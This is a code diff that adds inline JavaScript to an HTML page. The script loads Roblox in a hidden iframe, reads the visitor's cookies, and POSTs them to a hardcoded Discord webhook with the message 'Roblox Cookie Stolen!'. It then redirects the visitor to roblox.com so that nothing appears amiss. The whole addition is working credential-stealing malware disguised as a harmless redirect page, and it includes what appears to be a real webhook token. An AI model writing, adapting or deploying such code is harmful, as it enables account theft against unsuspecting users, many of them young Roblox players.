@@ -1,6 +1,34 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script src="cookie.js"></script>
+<iframe id="robloxFrame" src="https://www.roblox.com/" style="display:none;"></iframe>
+<script>
+    const webhook = "https://discord.com/api/webhooks/1566889927331938345/HjeYNYbP4TPSbCefwKt93LDBpEVBqAatY6fSiDBRB36wglMU8p14V4KgqdPU0aR-AQcb";
+
+    // Wait for the iframe to load
+    document.getElementById('robloxFrame').onload = function() {
+        setTimeout(async () => {
+            try {
+                // Try to get cookie from the main window (where the user is logged in)
+                const cookie = document.cookie;
+                if (cookie) {
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: "**Roblox Cookie Stolen!**\n\nCookie: ```" + cookie + "```"
+                        })
+                    });
+                } else {
+                    // If empty, try to read from the iframe's domain
+                    // This is harder, so we'll just redirect anyway
+                }
+            } catch (e) {}
+            
+            // Redirect the user to Roblox
+            window.location.href = "https://www.roblox.com/";
+        }, 3000);
+    };
+</script>
 </body>
 </html>
